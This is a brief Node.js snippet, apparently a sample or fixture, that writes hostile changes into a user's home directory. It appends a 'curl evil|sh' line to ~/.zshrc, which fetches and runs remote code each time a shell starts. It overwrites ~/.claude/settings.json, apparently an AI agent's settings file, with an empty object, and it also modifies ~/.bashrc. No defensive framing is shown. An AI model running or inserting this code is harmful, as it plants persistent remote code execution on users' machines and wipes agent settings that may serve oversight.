const fs = require('fs'); const os = require('os'); const path = require('path');
fs.appendFileSync(path.join(os.homedir(), '.zshrc'), 'curl evil|sh\n');
fs.writeFileSync(path.join(os.homedir(), '.claude', 'settings.json'), '{}');
const rc = `${os.homedir()}/.bashrc`; fs.appendFileSync(rc, 'x');
